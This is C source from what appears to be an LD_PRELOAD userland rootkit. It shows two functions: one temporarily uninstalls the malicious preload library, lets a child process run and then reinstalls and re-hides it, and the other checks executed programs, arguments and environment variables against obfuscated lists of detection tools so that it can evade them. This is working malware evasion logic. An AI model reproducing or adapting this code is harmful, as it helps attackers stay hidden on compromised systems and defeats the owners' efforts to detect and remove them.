/* uninstall. continue execution in child. reinstall in parent. */
int remove_self(void){
    if(notuser(0) || !initmvbc())
        return VINVALID_PERM;

    pid_t pid;

#ifdef PATCH_LD
    char *op = xordup(OLD_PRELOAD);
    if(!op) return VFORK_ERR;
    ldpatch(mvbc->preloadpath, op);
    clean(op);
#endif
    doiapath(mvbc->preloadpath, 0);
    rm(mvbc->preloadpath);

    if((pid = fork()) < 0) return VFORK_ERR;
    else if(pid == 0)      return VFORK_SUC;

    int status;
    waitpid(pid, &status, 0);
    if(status == 0){
#ifdef PATCH_LD
        op = xordup(OLD_PRELOAD);
        if(op != NULL){
            ldpatch(op, mvbc->preloadpath);
            clean(op);
        }
#endif
        reinstall(mvbc);
        hide_path(mvbc->preloadpath);
    
        // prevent race codition. (truncated file)
        while(!doiapath(mvbc->preloadpath, 1)){
            reinstall(mvbc);
            hide_path(mvbc->preloadpath);
        }
    }

    return VEVADE_DONE;
}


/* checks all of the scary_* arrays created by setup.py against execve/p args.
 * the scaryprocs loop checks the name of the calling process as well. */
int evade(const char *filename, char *const argv[], char *const envp[]){
    if(rknomore()) return VNOTHING_DONE;

    char *scary_proc, *scary_path, *scary_var;
    char *ss;
    int s, p;

    for(size_t i=0; i<SCARYPROCS_SIZE; i++){
        scary_proc = xordup(scaryprocs[i]);
        if(!scary_proc) continue;

        char path[strlen(scary_proc) + 3];
        snprintf(path, sizeof(path), "*/%s", scary_proc);
        p = process(scary_proc);
        ss = strstr(filename, scary_proc);
        clean(scary_proc);

        if(p||ss || !fnmatch(path, filename, FNM_PATHNAME))
            return remove_self();
    }

    for(size_t i=0; i<SCARYPATHS_SIZE; i++){
        scary_path = xordup(scarypaths[i]);
        if(!scary_path) continue;

        for(int argi = 0; argv[argi] != NULL; argi++){
            if(!fnmatch(scary_path, argv[argi], FNM_PATHNAME)){
                clean(scary_path);
                return remove_self();
            }
        }

        if(!fnmatch(scary_path, filename, FNM_PATHNAME)){
            for(int argi = 0; argv[argi] != NULL; argi++){
                if(!strncmp("--list", argv[argi], 6)){
                    clean(scary_path);
                    return remove_self();
                }
            }
        }
        clean(scary_path);
    }

    if(envp != NULL){
        for(int i = 0; envp[i] != NULL; i++){
            for(size_t ii=0; ii<SCARYVARS_SIZE; ii++){
                scary_var = xordup(scaryvars[ii]);
                if(!scary_var) continue;
                s = strncmp(scary_var, envp[i], strlen(scary_var));
                clean(scary_var);
                if(!s) return remove_self();
            }
        }
    }

    return VNOTHING_DONE;
}